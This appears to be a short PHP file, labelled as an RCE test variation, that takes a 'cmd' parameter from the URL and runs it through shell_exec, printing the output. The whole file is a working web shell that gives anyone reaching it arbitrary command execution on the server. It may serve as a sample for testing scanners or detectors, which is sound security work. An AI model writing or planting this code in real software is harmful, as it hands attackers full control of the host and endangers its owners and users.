<?php
// RCE test variation #1406
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>